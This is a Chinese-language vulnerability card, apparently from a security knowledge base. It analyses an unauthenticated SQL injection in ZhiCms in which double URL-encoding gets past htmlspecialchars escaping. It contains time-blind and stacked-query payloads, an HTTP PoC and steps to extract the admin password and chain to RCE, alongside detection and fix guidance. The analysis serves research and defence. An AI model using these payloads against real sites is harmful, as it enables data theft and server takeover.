---
id: web-generic-sqli-zhicms-cheaps-key-urldecode-stacked
title: ZhiCms 前台 cheaps key SQL 注入：双重 urldecode 绕过 arg() 的 ENT_QUOTES 转义，PDO prepare 下可堆叠
type: scenario
domain: web
path: web/generic/sqli
technique: zhicms-cheaps-key-double-urldecode-sqli
aliases:
- ZhiCms SQL注入
- ZhiCms cheaps index 注入
- urldecode 绕过 htmlspecialchars
- ENT_QUOTES 二次解码绕过
- ZhiCms 堆叠注入
tags:
- php
- sqli
- zhicms
- urldecode
- htmlspecialchars
- ent-quotes
- stacked-queries
- pdo
- time-blind
- unauthenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:58:03+08:00'
  notes: 已对照原文 content.md 与全部 10 张图逐项核对：arg() 合并 GET/POST + htmlspecialchars ENT_QUOTES（图05/02）、cheapscontroller 的 urldecode(urldecode(arg('key'))) 与 title LIKE '%{$key}%' 拼接（图03）、MysqlPdoDriver._bindParams 直接 prepare(bindValue) 支持堆叠（图04/07）、payload 与两次 URL 编码演示（图06 GIF 首帧）、原文时间盲注/堆叠 PoC 一致。验证中修正：原文机制实为 PHP 解析查询串自动解码一次 + 控制器第一层 urldecode 即还原引号，嵌套第二次 urldecode 对该 payload 冗余（原卡表述为两次解码依次还原，已精确化）；id 分支实际拼接列为 cid（原卡写 id）。affected_versions 按原文未标产品版本省略正确。dedup new，候选为其他产品 SQLi，无同 CVE/同 sink；dup-scan 无本卡 pair。未验证点：PoC 未复跑；console 中 r 路由/框架是否有额外解码未单独验证。
---

## 一句话结论

ZhiCms 的 `app/index/controller/cheapscontroller.php#index()` 对 `key` 参数先调用 `$this->arg("key")`（内部 `htmlspecialchars(..., ENT_QUOTES)` 转义单双引号），随后又执行 `urldecode(urldecode(...))`；攻击者把带引号的 payload 做两次 URL 编码，框架转义时看到的只是 `%25%27` 之类的文本，转义之后 `urldecode` 才还原出单引号并直接拼进 `` `title` LIKE '%{$key}%' ``，形成前台未授权 SQL 注入；该 SQL 经 `MysqlPdoDriver` 直接 `prepare($sql)`，原文还验证了 `';select sleep(1)#` 的堆叠注入。

## 原理

- **取值与转义**：ZhiCms 控制器统一用 `BaseController::arg()` 取 GET/POST 参数：先合并 `$_GET`/`$_POST`、正则去掉 `<script>/<iframe>/<style>/<tag>`，再 `trim` + `htmlspecialchars($arg, ENT_QUOTES, 'UTF-8')`。`ENT_QUOTES` 会同时把单引号和双引号转成 HTML 实体，正常情况下阻断引号型注入。
- **二次解码绕过**：`cheapscontroller::index()` 中 `$key = urldecode(urldecode($this->arg("key")));` 连续解码两次。输入经过两层 URL 编码、PHP 解析查询串自动解码一次后，`arg()` 看到的是仍处于编码态、不含字面引号的字符串（如 `%25%27`），`htmlspecialchars` 无事可做；随后控制器的 `urldecode` 把 `%25%27` 还原成 `%'`（第一层解码即完成，嵌套的第二次 `urldecode` 对该 payload 是冗余的），引号在转义之后才出现。
- **拼接点**：`$where[] = "`title` LIKE '%{$key}%'";` 随后交给 `obj('api/ApiData')->PageIndex(...)`，最终进入 `ZhiCms/base/db/MysqlPdoDriver.php` 的 `query()`/`_bindParams()`；`_bindParams` 只是把已拼好的 `$sql` 传给 `$link->prepare($sql)` 再 `bindValue`，注入点不在参数绑定层。
- **堆叠注入**：由于整段 SQL 字符串直接进 `prepare()`，原文用 `test%';select sleep(1)#`（同样双重编码）验证了堆叠执行，说明该 PDO 连接允许一次提交多语句（MySQL 多语句/模拟预处理）。
- **利用价值**：前台无需登录即可时间盲注/布尔盲注拖库；原文指出可进一步取得后台管理员账户口令，从而进入后台（衔接后台配置写入 RCE，见关联卡）。

## 触发条件

- 目标为 ZhiCms（原文环境 PHP 7.1.9 + MySQL），使用默认 `index.php?r=...` 路由。
- 前台 `index/cheaps/index` 可达，`key` 或 `id` 参数进入上述 where 拼接；`key` 分支存在双重 `urldecode`。
- 目标未对双重编码/异常引号做 WAF 拦截；数据库账号具备注入所需的读权限。
- 堆叠注入需要 PDO 驱动允许一次 prepare 执行多语句（原文环境成立，其他环境需实测）。

## 利用步骤

1. 先确认参数可达：`GET /index.php?r=index/cheaps/index&key=test`。
2. 构造时间盲注 payload 并做两次 URL 编码后作为 `key` 发送：
   `test%' and (select * from (select if(ascii(substr(database(),1,1))>0,sleep(1),1))A)#`
3. 观察响应是否延迟约 1 秒，确认注入；用 `substr`/`ascii` 逐字符或布尔条件拖出数据库名、管理员表与口令哈希。
4. 堆叠验证：`test%';select sleep(1)#` 两次编码后发送，同样以延迟确认多语句执行。
5. 拿到后台管理员口令后登录后台，衔接 `app/manage/controller/setcontroller.php#index()` 的配置写入（见关联卡）获取 RCE。

## PoC

```http
GET /index.php?r=index/cheaps/index&key=<双重URL编码后的payload> HTTP/1.1
Host: target
Accept: text/html
Connection: close
```

原始 payload（Burp Decoder 做两次 URL 编码后放入 `key`）：

```text
test%' and (select * from (select if(ascii(substr(database(),1,1))>0,sleep(1),1))A)#
```

堆叠版本：

```text
test%';select sleep(1)#
```

- 两次编码后 `%` 变为 `%2525`、`'` 变为 `%2527`；PHP 解析查询串自动解码一次后 `arg()` 只看到 `%25%27`，控制器 `urldecode` 再还原出 `%'`（嵌套的第二次 `urldecode` 冗余）。
- `id` 分支直接拼接 `` `cid` = {$this->arg('id')} ``（图 03），可尝试纯数字型注入（原文未展开）。

## 变体与关联

- 变体：同框架其他控制器若把 `arg()` 结果或 `$_POST` 直接拼进 SQL（原文截图中的 `index/api/insertdata` 对 `$_POST['link']` 直接 `LIKE '{$_POST['link']}'`，仅有一个常量 `pw` 校验），同样可能注入，需按目标代码确认。
- 关联：[[web-php-rce-zhicms-manage-set-siteconfig-write]]（本链取得后台管理员后，利用后台基础设置写入 `siteconfig.php` getshell 的后续步骤）。
- 关联：[[web-php-deserialization-zhicms-cve-2024-0603-simple-html-dom-template-eval]]（同产品另一条反序列化 RCE，入口与 sink 不同）。
- 关联：[[web-generic-sqli-mssql-backup-sp-makewebtask-webshell]]（SQL 注入直接落 WebShell 的另一思路，与本文“注入取后台凭据再写文件”的链不同）。

## 检测与防御

- 检测：请求参数中出现双重编码的 `%2527`/`%2525` 等特征、`sleep(`、`substr(`、`if(`、`ascii(`、`#` 注释；同 IP 对 `index/cheaps/index` 的高频带 `key` 请求与响应时间异常。
- 检测：数据库层慢查询日志中出现 `LIKE '%...' and (select ... sleep(...))`、`;select sleep` 等拼接痕迹。
- 防御：参数化查询（`WHERE title LIKE CONCAT('%', ?, '%')`），不要在业务层做“先转义再解码”；去掉 `urldecode` 嵌套，明确只解码一次并拒绝二次编码输入。
- 防御：PDO 关闭多语句（`PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`），数据库账号最小权限；WAF 对双重编码做递归解码检测。
